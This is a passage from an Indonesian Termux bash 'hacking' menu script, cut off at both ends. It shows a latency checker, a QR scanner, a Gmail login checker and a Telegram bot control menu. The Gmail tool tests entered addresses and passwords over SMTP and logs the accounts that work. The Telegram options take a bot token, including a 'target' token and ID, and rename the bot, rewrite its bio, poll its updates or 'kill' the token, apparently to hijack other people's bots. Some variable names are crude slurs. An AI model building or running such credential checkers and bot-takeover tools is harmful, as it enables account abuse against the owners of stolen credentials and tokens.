if [ -n "$cek" ]; then
  if [ $(echo "$cek < 50" | awk '{print ($1 < 50)}') -eq 1 ]; then
res="Sangat Cepat ✅"
 war="\033[32;1m"
elif [ $(echo "$cek < 150" | awk '{print ($1 < 150)}') -eq 1 ]; then
 res="Cepat 👍"
 war="\033[34;1m"
elif [ $(echo "$cek < 300" | awk '{print ($1 < 300)}') -eq 1 ]; then
 res="Sedang ⚠️"
 war="\033[33;1m"
else
    res="Lambat ❌"
    war="\033[31;1m"
fi
echo -e "${war}Kecepatan Internet : ${cek} ms - ${res}"
echo -e "\033[90;1mLast update : $(date '+%H:%M:%S')"
else
echo -e "\033[31;1m❌ TIDAK ADA KONEKSI INTERNET!"
echo -e "\033[90;1mLast update : $(date '+%H:%M:%S')"
fi
sleep 1
done
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
   ;;
      34)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
              cd $HOME
g="\033[32;1m"
r="\033[31;1m"
c="\033[36;1m"
y="\033[33;1m"
p="\033[35;1m"
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣶⠾⠿⠿⠯⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣾⠛⠁⠀⠀⠀⠀⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠁⠀⠀⠀⢀⣤⣾⣟⣛⣛⣶⣬⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠃⠀⠀⠀⠀⠀⣾⣿⠟⠉⠉⠉⠉⠛⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡟⠋⠀⠀⠀⠀⠀⠀⠀⣿⡏⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⡿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣼⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠷⣤⣤⣠⣤⣤⡤⡶⣶⢿⠟⠹⠿⠄⣿⣿⠏⠀⣀⣤⡦⠀⠀⠀⠀⣀⡄
⢀⣄⣠⣶⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠓⠚⠋⠉⠀⠀⠀⠀⠀⠀⠈⠛⡛⡻⠿⠿⠙⠓⢒⣺⡿⠋⠁
⠉⠉⠉⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉" | lolcat
echo -e "${r}=================================================="
echo -e "${g}       GMAIL SENDER DETECTOR THXYZZ404"
echo -e "${r}=================================================="
echo -e "${c}"
read -p "Masukkan gmail : " tolol
echo -e "${y}"
read -p "Masukkan pw sender : " memek
echo ""
echo -e "${r}=================================================="
echo -e "${g}               CHECK PROSESING"
echo -e "${r}=================================================="
echo ""
python3 - <<EOF
import smtplib
import sys
from datetime import datetime
pengirim = "$tolol"
password = "$memek"
g="\033[32;1m"
r="\033[31;1m"
c="\033[36;1m"
y="\033[33;1m"
p="\033[35;1m"
b="\033[34;1m"
try:
    server = smtplib.SMTP("smtp.gmail.com", 587, timeout=10)
    server.starttls()   
    print(f"{c} Development {g}: {y}Thxyzz404")
    server.login(pengirim, password)
    test_msg = f"""From : {pengirim}
To : {pengirim}
Subject : Test Sender - {datetime.now().strftime('%H:%M:%S')}
Status : SENDER AKTIF
Waktu : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
    server.sendmail(pengirim, pengirim, test_msg)
    server.quit()
    print(f"{g}")  
    print("╔══════════════════════════════════════════╗")
    print("║            ✓ SENDER AKTIF ✓              ║")
    print("╚══════════════════════════════════════════╝")
    print(f"{b}")
    print(f"📧 Email : {pengirim}")
    print(f"✅ Status : {g}Sukses_Check")
    print(f"{b}⏰ Waktu : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    with open("gmail_active.txt", "a") as f:
        f.write(f"[AKTIF] {pengirim} | {datetime.now()}\n")   
except smtplib.SMTPAuthenticationError:
    print(f"{r}")
    print("╔══════════════════════════════════════════╗")
    print("║          ✗ SENDER TIDAK AKTIF ✗          ║")
    print("╚══════════════════════════════════════════╝")
    print(f"{p}")
    print(f"📧 Email : {pengirim}")
    print(f"❌ Error : Autentikasi gagal - Password salah/akun tidak valid")   
except smtplib.SMTPException as e:
    error_msg = str(e)
    print(f"{r}")
    print("╔══════════════════════════════════════════╗")
    print("║          ✗ SENDER TIDAK AKTIF ✗          ║")
    print("╚══════════════════════════════════════════╝")
    print(f"{y}")
    print(f"📧 Email : {pengirim}") 
    if "Application-specific password required" in error_msg:
        print("❌ Error : Perlu App Password")
    elif "Username and Password not accepted" in error_msg:
        print("❌ Error : Login ditolak")
    else:
        print(f"❌ Error : {error_msg}")     
except Exception as e:
    print(f"{r}❌ ERROR : {str(e)}")
EOF
echo ""
echo -e "${r}=================================================="
echo -e "${p}           Development ${g}: ${c}Thxyzz404"
echo -e "${r}=================================================="
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
 ;;
    35)
       echo ""
       mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
       echo -e "${c} Anda Memilih Menu Hacking..!!"
       echo ""
       echo -e "${r} VIP UNLOCK..!!"
       sleep 2
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
w='\033[37;1m'
b='\033[34;1m'
if ! command -v zbarimg &> /dev/null; then
    clear
    echo ""
    echo -e "${r}[ ${g}! ${r}]${c} Installing Packages..!!${w}"
    sleep 2
    echo -e "${n}"
    echo -e "${y}pkg install zbar file lolcat -y${w}"
    pkg install zbar file lolcat -y
else
    clear 
    echo ""
    echo -e "${g}Package sudah terinstall..!!"
    sleep 3
fi
clear
echo ""
echo "
 ██████╗ ██████╗ 
██╔═══██╗██╔══██╗
██║   ██║██████╔╝
██║▄▄ ██║██╔══██╗
╚██████╔╝██║  ██║
 ╚══▀▀═╝ ╚═╝  ╚═╝
Develop : Thxyzz404
Tools : QR Code Scanner
Platform : Termux" | lolcat
echo ""
read -p "Masukkan path gambar QR : " img
img=$(echo "$img" | sed "s/^['\"]//;s/['\"]$//")
echo ""
if [ ! -f "$img" ]; then
    echo -e "${r}[ ${c}ERROR ${r}]${y} File tidak ditemukan..!!"
    echo -e "${y}Cek path : $img"
    echo ""
fi
if ! file "$img" | grep -E -q "image|bitmap|JPEG|PNG|GIF"; then
    echo -e "${r}[ ${c}ERROR ${r}]${y} File bukan gambar yang valid..!!"
    echo ""
fi
echo -e "${r}[ ${g}INFO ${r}]${c} Memulai proses decode QR Code..!!"
echo -e "${r}[ ${g}FILE ${r}]${w} $img"
echo -e "${r}[ ${g}WAKTU ${r}]${c} $(date '+%H:%M:%S %d-%m-%Y')"
echo ""
echo -e "${r}[ ${g}SCAN ${r}]${y} Scanning QR Code..!!"
hasil=$(zbarimg --quiet --raw "$img" 2>/dev/null)
exit_code=$?
if [ $exit_code -eq 0 ] && [ -n "$hasil" ]; then
    echo -e "${r}[ ${g}SUKSES ${r}]${g} QR Code berhasil dibaca!"
    echo ""
    file_info=$(file -b "$img")
    echo -e "${r}[ ${g}JENIS ${r}]${c} $file_info"
    echo ""
    if [[ "$hasil" =~ ^https?:// ]]; then
        tipe="URL/Link"
        warna=$g
    elif [[ "$hasil" =~ @ ]] && [[ "$hasil" =~ \. ]]; then
        tipe="Email"
        warna=$c
    elif [[ "$hasil" =~ ^\+[0-9]+$ ]] || [[ "$hasil" =~ ^tel: ]]; then
        tipe="Nomor Telepon"
        warna=$b
    elif [[ "$hasil" =~ BEGIN:VCARD ]]; then
        tipe="Kontak (vCard)"
        warna=$y
    elif [[ "$hasil" =~ WIFI: ]]; then
        tipe="Koneksi WiFi"
        warna=$g
    elif [[ "$hasil" =~ ^[0-9]+$ ]] && [ ${#hasil} -gt 8 ]; then
        tipe="Kode/Nomor"
        warna=$w
    else
        tipe="Teks Biasa"
        warna=$w
    fi
    echo -e "${r}[ ${g}TIPE ${r}]${warna} $tipe"
    echo -e "${r}[ ${g}DATA ${r}]${w} $hasil"
    echo ""
    if [[ "$hasil" =~ ^https?:// ]]; then
        echo -e "${r}[ ${g}OPSI ${r}]${y} Mau buka link? (y/n) : ${w}"
        read -n 1 buka
        if [[ $buka == "y" || $buka == "Y" ]]; then
            echo ""
            echo -e "${r}[ ${g}BUKA ${r}]${c} Membuka link..!!"
            am start --user 0 -a android.intent.action.VIEW -d "$hasil" 2>/dev/null
            if [ $? -ne 0 ]; then
                echo -e "${r}[ ${g}LINK ${r}]${y} $hasil"
            fi
        fi
        echo ""
    fi
else
    echo -e "${r}[ ${g}GAGAL ${r}]${y} Tidak ada QR code terdeteksi"
    echo ""
    echo -e "${r}[ ${g}TIPS ${r}]${y} Penyebab gagal:"
    echo -e "${y}• Gambar blur/rusak"
    echo -e "${y}• QR code terlalu kecil"
    echo -e "${y}• Format tidak didukung"
    echo -e "${y}• Pencahayaan buruk"
    echo ""
    echo -e "${r}[ ${g}SOLUSI ${r}]${c} Coba gambar yang lebih jelas!"
    echo ""
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
    ;;
 36)
       echo ""
       mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
       echo -e "${c} Anda Memilih Menu Hacking..!!"
       echo ""
       echo -e "${r} VIP UNLOCK..!!"
       sleep 2
       cd $HOME
c='\033[36;1m'
p='\033[35;1m'
g='\033[32;1m'
y='\033[33;1m'
r='\033[31;1m'
n='\033[0m'
bold_bg='\033[41;1m'
bold_gren='\033[1;32m'
BOLD_RED_BG='\033[101m'
show_error() {
    echo -e "${r}❌ $1${n}"
    echo -e "\n${BOLD_RED_BG}${g}Silahkan Enter Untuk Kembali${n}"
    read
}
clear 
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣆⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⠁⠀⠿⢿⣿⡿⣿⣿⡆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣴⣿⠃⠀⠿⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⡿⠋⠁⣿⠟⣿⣿⢿⣧⣤⣴⣿⡇⠀
⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠘⠁⢸⠟⢻⣿⡿⠀⠀
⠀⠀⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⣇⢀⣤⠀⠀⠀⠀⠘⣿⠃⠀⠀
⠀⠀⠀⠀⠀⢈⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⣿⢀⣴⣾⠇⠀⠀⠀
⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀
⠀⠀⠉⠉⠉⠉⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⡿⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⣴⡾⠿⠿⠿⠛⠋⠉⠀⢸⣿⣿⣿⣿⠿⠋⢸⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡿⠟⠋⠁⠀⠀⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠈⠀" | lolcat
echo ""
echo -e "${p} Pengembangan ${g}: ${c}By.Thxyzz404"
echo ""
echo -e "${c}====================================================="
echo -e "${r}     CONTROLL BOTZ TELEGRAM ALL,IN MENU CTRL"
echo -e "${c}====================================================="
echo -e "${r}     [ ${g}01 ${r}]${y} Ubah nama bio botz."
echo -e "${r}     [ ${g}02 ${r}]${y} Ubah nama user botz."
echo -e "${r}     [ ${g}03 ${r}]${y} Menu,in All control botz."
echo -e "${r}     [ ${g}04 ${r}]${y} Ubah profil botz telegram."
echo -e "${r}     [ ${g}05 ${r}]${y} Bunuh botz token."
echo -e "${r}     [ ${g}06 ${r}]${y} Kembali ke awall"
echo -e "${p}====================================================="
echo -e "${g}"
read -p ">>>>>>>> Masukkan pilihan anda : " kuy
case $kuy in
1|01)
echo ""
echo -ne "${g}─(${r}?${g})─${r} Masukkan Token Bot Telegram ${g}: ${y}"
read TOKEN
url_getme="https://api.telegram.org/bot${TOKEN}/getMe"
response=$(curl -s "$url_getme")
if [[ $(echo "$response" | jq -r '.ok') == "true" ]]; then
    bot_id=$(echo "$response" | jq -r '.result.id')
    bot_username=$(echo "$response" | jq -r '.result.username')
    bot_first_name=$(echo "$response" | jq -r '.result.first_name // "(Tidak ada)"')
    clear
    echo -e "${c}
    ⠀⠀⠀⠀⠀⢀⣤⣶⣶⠖⠀⠀⠲⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣇⣤⠶⠛⣛⣉⣙⡛⠛⢶⣄⣸⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣀⣿⣿⣿⡟⢁⣴⣿⣿⣿⣿⣿⣿⣦⡈⢿⣿⣿⣿⣀⡀⠀⠀⠀⠀
⠀⠀⢠⣴⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣦⡄⠀⠀
⠀⣴⣿⣿⡿⠿⢛⣻⡇⢸⡟⠻⣿⣿⣿⣿⣿⡿⠟⢻⡇⣸⣛⡛⠿⣿⣿⣿⣦⠀
⢸⣿⡿⠋⠀⠀⢸⣿⣿⡜⢧⣄⣀⣉⡿⣿⣉⣀⣠⣼⢁⣿⣿⡇⠀⠀⠙⢿⣿⡆
⣿⣿⠁⠀⠀⠀⠈⣿⣿⡇⣿⡿⠛⣿⣵⣮⣿⡟⢻⡿⢨⣿⣿⠀⠀⠀⠀⠈⣿⣿
⢿⡟⠀⠀⠀⠀⠀⠘⣿⣷⣤⣄⡀⣿⣿⣿⣿⢁⣤⣶⣿⣿⠃⠀⠀⠀⠀⠀⣿⡟
⠘⠇⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡇⢿⣿⣿⣿⢸⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠻⠃
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⢩⣦⣘⡘⠋⣛⣸⡍⠁⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⠀⠘⢿⣷⣤⣤⣄⣤⣤⣶⣿⣿⣿⡿⢿⣿⣿⣿⣷⣤⣤⣠⣤⣴⣾⡿⠁⠀⠀
⠀⠀⠀⠀⠉⠛⠿⠿⠿⡿⠿⠿⠛⠉⠀⠀⠉⠛⠿⠿⣿⠿⠿⠿⠛⠉⠀⠀
"⠀⠀
    echo -e "\n${BOLD_RED_BG}${g}=====[ INFORMASI TOKEN BOT ]=====${n}\n"
    echo -e "${g}─(${r}Id Bot${g})─${y} : ${r}${bot_id}${n}"
    echo -e "${g}─(${r}Username Bot${g})─${y} : ${r}@${bot_username}${n}"
    echo -e "${g}─(${r}Nama Bot${g})─${y} : ${r}${bot_first_name}${n}"
    url_getbio="https://api.telegram.org/bot${TOKEN}/getMyShortDescription"
    response_bio=$(curl -s "$url_getbio")
    if [[ $(echo "$response_bio" | jq -r '.ok') == "true" ]]; then
        old_bio=$(echo "$response_bio" | jq -r '.result.short_description // "(Belum ada bio)"')
        echo -e "${g}─(${r}Bio Lama${g})─${y} : ${r}${old_bio}${n}"
    else
        echo ""
        echo -e "${r}⚠️ Gagal mengambil bio lama : $(echo "$response_bio" | jq -r '.description // "Unknown error"')${n}"
        old_bio=""
        echo ""
    fi
    new_bio=""
    while [[ -z "$new_bio" ]]; do
        echo -ne "\n${g}─(${r}?${g})─ Masukkan Bio Baru${g} : ${y}"
        read -r new_bio
        if [[ -z "$new_bio" ]]; then
            echo ""
            echo -e "${r}⚠️ Bio baru tidak boleh kosong.Coba lagi!${n}"
            echo ""
        fi
    done
    url_setbio="https://api.telegram.org/bot${TOKEN}/setMyShortDescription"
    response_set=$(curl -s -X POST "$url_setbio" -d "short_description=$new_bio")
    if [[ $(echo "$response_set" | jq -r '.ok') == "true" ]]; then
        echo -e "\n${g}[ ${c}✓ ${g}]${r} Bio Bot Berhasil Diubah Menjadi :${y} ${new_bio}${n}"
        echo -e "\n${BOLD_RED_BG}${g}Silahkan Enter Untuk Kembali.${n}"
        read
    else
        echo ""
        show_error "Gagal mengubah bio bot : $(echo "$response_set" | jq -r '.description // "Unknown error"')"
        echo ""
    fi
else
    echo ""
    show_error "Token tidak valid atau API error : $(echo "$response" | jq -r '.description // "Unknown error"')"
    echo ""
fi
;;
2|02)
echo ""
echo -ne "${g}─(${r}?${g})─${r} Masukkan Token Bot Telegram${g} :${y} "
read -r TOKEN
url_getme="https://api.telegram.org/bot${TOKEN}/getMe"
response=$(curl -s "$url_getme")
ok=$(echo "$response" | jq -r '.ok')
if [[ "$ok" == "true" ]]; then
    bot_id=$(echo "$response" | jq -r '.result.id')
    bot_username=$(echo "$response" | jq -r '.result.username')
    bot_name=$(echo "$response" | jq -r '.result.first_name')
    clear
echo -e "${y}
    ⠀⠀⠀⠀⠀⢀⣤⣶⣶⠖⠀⠀⠲⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣇⣤⠶⠛⣛⣉⣙⡛⠛⢶⣄⣸⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣀⣿⣿⣿⡟⢁⣴⣿⣿⣿⣿⣿⣿⣦⡈⢿⣿⣿⣿⣀⡀⠀⠀⠀⠀
⠀⠀⢠⣴⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣦⡄⠀⠀
⠀⣴⣿⣿⡿⠿⢛⣻⡇⢸⡟⠻⣿⣿⣿⣿⣿⡿⠟⢻⡇⣸⣛⡛⠿⣿⣿⣿⣦⠀
⢸⣿⡿⠋⠀⠀⢸⣿⣿⡜⢧⣄⣀⣉⡿⣿⣉⣀⣠⣼⢁⣿⣿⡇⠀⠀⠙⢿⣿⡆
⣿⣿⠁⠀⠀⠀⠈⣿⣿⡇⣿⡿⠛⣿⣵⣮⣿⡟⢻⡿⢨⣿⣿⠀⠀⠀⠀⠈⣿⣿
⢿⡟⠀⠀⠀⠀⠀⠘⣿⣷⣤⣄⡀⣿⣿⣿⣿⢁⣤⣶⣿⣿⠃⠀⠀⠀⠀⠀⣿⡟
⠘⠇⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡇⢿⣿⣿⣿⢸⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠻⠃
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⢩⣦⣘⡘⠋⣛⣸⡍⠁⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⠀⠘⢿⣷⣤⣤⣄⣤⣤⣶⣿⣿⣿⡿⢿⣿⣿⣿⣷⣤⣤⣠⣤⣴⣾⡿⠁⠀⠀
⠀⠀⠀⠀⠉⠛⠿⠿⠿⡿⠿⠿⠛⠉⠀⠀⠉⠛⠿⠿⣿⠿⠿⠿⠛⠉⠀⠀
"⠀⠀
    echo -e "\n${BOLD_RED_BG}${g}=====INFORMASI TOKEN BOT=====${n}\n"
    echo -e "${g}─(${r}Id Bot${g})─${y} : ${g}─(${r}${bot_id}${g})─"
    echo -e "${g}─(${r}Username Bot${g})─${y} : ${g}─(${r}@${bot_username}${g})─"
    echo -e "${g}─(${r}Nama Bot${g})─${y} : ${g}─(${r}${bot_name:-'(Tidak ada)'}${g})─"
    new_name=""
    while [[ -z "$new_name" ]]; do
        echo -ne "\n${g}─(${r}?${g})─${r} Masukkan Nama Baru${g} :${y} "
        read -r new_name
        if [[ -z "$new_name" ]]; then
            echo ""
            echo -e "${bg_red}${g}Ga Boleh Kosong Namanya${n}"
            echo ""
        fi
    done
    url_setname="https://api.telegram.org/bot${TOKEN}/setMyName"
    response_set=$(curl -s -X POST -d "name=${new_name}" "$url_setname")
    ok_set=$(echo "$response_set" | jq -r '.ok')
    if [[ "$ok_set" == "true" ]]; then
        echo -e "\n${g}─(${r}!${g})─${r} Nama Bot Berhasil Diubah Menjadi ${y}${new_name}${n}"
        read -p $'\n\033[101m\033[1;32mSilahkan Enter Untuk Kembali\033[0m' _
        echo ""
    else
        clear 
        echo ""
        echo -e "${r}❌ Gagal mengubah nama bot : $response_set"
        echo ""
        read -p $'\n\033[101m\033[1;32mSilahkan Enter Untuk Kembali\033[0m' _
    fi
else
    clear 
    echo ""
    echo -e "${r}❌ Token tidak valid atau API error : $response"
    echo ""
    read -p $'\n\033[101m\033[1;32mSilahkan Enter Untuk Kembali\033[0m' _
fi
;;
  3|03)
CONFIG_FILE="id_target.txt"
LAST_UPDATE_ID=0
setup() {
    echo -e "${g}"
    read -p ">> Masukkan token target : " TOKEN
    TOKEN=$(echo "$TOKEN" | tr -d ' ')
    echo -e "${r}"
    read -p ">> Masukkan id target : " TARGET_ID
    TARGET_ID=$(echo "$TARGET_ID" | tr -d ' ')
    echo "TOKEN=$TOKEN" > $CONFIG_FILE
    echo "TARGET_ID=$TARGET_ID" >> $CONFIG_FILE
    if test_connection; then
        clear 
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${c} Token valid dan terhubung..!!"
        sleep 3 
        echo ""
        return 0
    else
        clear
        echo ""
        echo -e "${y}[✗] Token tidak valid atau koneksi gagal..!!"
        sleep 3 
        echo ""
        rm -f $CONFIG_FILE
        return 1
    fi
}
load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        source $CONFIG_FILE 
        echo ""
        echo -e "${n}Konfigurasi ditemukan."
        echo -e "${g}Token : ${TOKEN:0:10}"
        echo -e "${r}Target ID : $TARGET_ID"
        echo -e "${c}"      
        read -p "Apakah anda ingin mengganti token botz [ y/n ] : " use_old        
        if [ "$use_old" = "y" ] || [ "$use_old" = "Y" ]; then
            if test_connection; then
                clear 
                echo ""
                echo -e "${r}[ ${g}✓ ${r}] Menggunakan token lama..!!"
                sleep 3
                return 0
            else
                clear 
                echo ""
                echo -e "${r}[✗] Token tidak valid, perlu setup baru..!!"
                sleep 3 
                rm -f $CONFIG_FILE
                return 1
            fi
        else
            echo -e "${p}"
            read -p "Apakah Anda ingin mengubah token? [ y/n ] : " change_token          
            if [ "$change_token" = "y" ] || [ "$change_token" = "Y" ]; then
                clear 
                echo -e "${g}"
                read -p "Masukkan token baru : " new_token
                TOKEN=$(echo "$new_token" | tr -d ' ')
                sed -i "s/TOKEN=.*/TOKEN=$TOKEN/" $CONFIG_FILE
                if test_connection; then
                    clear 
                    echo -e "${r}[ ${g}✓ ${r}]${g} Token berhasil di ubah."
                    sleep 3
                    echo ""
                    clear
                else
                    clear 
                    echo ""
                    echo -e "${r} Token tidak valid."
                    sleep 3 
                    echo ""
                    clear 
                    rm -f $CONFIG_FILE
                    return 1
                fi
            fi            
            echo -e "${c}"
            read -p "Apakah Anda ingin mengubah id [ y/n ] : " change_target
            if [ "$change_target" = "y" ] || [ "$change_target" = "Y" ]; then
                clear 
                echo -e "${g}"
                read -p "Masukkan id baru : " new_target
                TARGET_ID=$(echo "$new_target" | tr -d ' ')
                sed -i "s/TARGET_ID=.*/TARGET_ID=$TARGET_ID/" $CONFIG_FILE
                clear 
                echo ""
                echo -e "${r}[ ${g}✓ ${r}]${c} Id berhasil di ubah."
                sleep 3 
                clear 
            fi
            source $CONFIG_FILE
            return 0
        fi
    fi
    return 1
}
test_connection() {
    local url="https://api.telegram.org/bot${TOKEN}/getMe"
    local response=$(curl -s -o /dev/null -w "%{http_code}" "$url" --max-time 10)   
    if [ "$response" -eq 200 ]; then
        return 0
    else
        return 1
    fi
}
display_banner() {
clear
echo "
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣾⣿⣿⣿⡄
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣿⣿⡿⠿⠛⢙⣿⣿⠃
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣶⣾⣿⣿⠿⠛⠋⠁⠀⠀⠀⣸⣿⣿⠀
        ⠀⠀⠀⠀⣀⣤⣴⣾⣿⣿⡿⠟⠛⠉⠀⠀⣠⣤⠞⠁⠀⠀⣿⣿⡇⠀
        ⠀⣴⣾⣿⣿⡿⠿⠛⠉⠀⠀⠀⢀⣠⣶⣿⠟⠁⠀⠀⠀⢸⣿⣿⠀⠀
        ⠸⣿⣿⣿⣧⣄⣀⠀⠀⣀⣴⣾⣿⣿⠟⠁⠀⠀⠀⠀⠀⣼⣿⡿⠀⠀
        ⠀⠈⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⢠⣿⣿⠇⠀⠀
        ⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⡇⠀⣀⣄⡀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣠⣾⣿⣿⣿⣦⡀⠀⠀⣿⣿⡏⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⡿⠋⠈⠻⣿⣿⣦⣸⣿⣿⠁⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⠀⠀⠀⠀⠈⠻⣿⣿⣿⠏ " | lolcat   
}
get_updates() {
    local url="https://api.telegram.org/bot${TOKEN}/getUpdates"
    local offset=$((LAST_UPDATE_ID + 1))
    local response=$(curl -s -X GET "$url" \
        -H "Content-Type: application/json" \
        -d "{\"offset\":$offset,\"timeout\":30}" \
        --max-time 35)
    if echo "$response" | grep -q '"ok":true'; then
